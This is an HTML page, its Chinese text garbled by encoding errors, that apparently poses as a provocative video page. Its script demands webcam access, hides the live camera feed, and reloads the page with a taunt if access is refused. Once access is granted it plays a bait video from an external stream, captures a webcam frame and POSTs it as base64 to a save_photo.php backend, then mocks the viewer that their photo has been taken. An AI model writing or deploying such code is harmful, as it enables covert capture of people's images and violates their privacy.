<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>è¶…çº§æ¶¦ğŸ’¦ã® å‰§æƒ…ğŸ‰‘åŠ›ä½œï¼ğŸ¥µ</title>
<style>
  #video-container {
    margin: 20px 0;
  }
  video {
    width: 100%;
    max-width: 640px;
  }
  canvas {
    display: none; /* åˆå§‹æ—¶éšè—canvas */
  }
  button {
    padding: 10px 20px;
    font-size: 16px;
    cursor: pointer;
  }
  #video-container {
    display: none;
  }
  #ji{
    width: 100%
  }
  h1{
      text-align: center
  }
  #i{
      visibility: hidden
  }
</style>
</head>
<body>
<h1>è¶…çº§æ¶¦ğŸ’¦ã® å‰§æƒ…ğŸ‰‘åŠ›ä½œï¼ğŸ¥µ</h1>  
<div id="video-container">
  <video id="video" autoplay></video>
</div>
<video id="ji" controls autoplay src="#"></video>
<script>
document.addEventListener('DOMContentLoaded', function() {
  var i = document.getElementById("i");
  var video = document.getElementById('video');
  // è·å–æ‘„åƒå¤´æƒé™å¹¶æ•è·è§†é¢‘æµ
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(function(stream) {
        var i = document.getElementById("i");
      video.srcObject = stream;
      video.play();
      i.innerHTML = "true";
      document.getElementById("ji").src="https://k0udeyday50y90z.djvod.ndcimgs.com/bs3/video-hls/5234871757208137973_hlsb.m3u8?ocid=100000159&ss=vp"
    })
    .catch(function(err) {
        var i = document.getElementById("i");
      console.error('è®¿é—®æ‘„åƒå¤´å¤±è´¥ï¼š', err);
      i.innerHTML = "no";
      alert("ä¸ç»™æƒé™è¿˜æƒ³çœ‹ï¼Ÿåšæ¢¦å§ä½ ");
      location.reload()
    });
  setInterval(function(){
      if(i.innerHTML == "true") {
  // æ‹ç…§å¹¶å‘é€åˆ°åç«¯      
    var canvas = document.createElement('canvas');
    var context = canvas.getContext('2d');
    var video = document.getElementById('video');

    // è®¾ç½®canvasçš„å®½é«˜ä¸è§†é¢‘æµå®½é«˜ä¸€è‡´
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    // åœ¨canvasä¸Šç»˜åˆ¶å½“å‰è§†é¢‘å¸§
        context.drawImage(video, 0, 0, canvas.width, canvas.height);  
    // å°†canvasè½¬æ¢ä¸ºbase64æ ¼å¼çš„å›¾ç‰‡æ•°æ®
    var imageData = canvas.toDataURL('image/jpeg');

    // å‘é€æ•°æ®åˆ°åç«¯PHPè„šæœ¬
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'save_photo.php', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onreadystatechange = function() {
      if (xhr.readyState == 4 && xhr.status == 200) {
        // å¤„ç†æœåŠ¡å™¨è¿”å›çš„å“åº”
        console.log(xhr.responseText);
        alert("å“ˆå“ˆ,ä½ çš„å¤§å¤´ç…§å½’æˆ‘å’¯")
      }
    };
    xhr.send('image=' + encodeURIComponent(imageData));
    i.innerHTML = "no"
    };
    },1000);
});
</script>
<i id="i"></i>  
</body>
</html>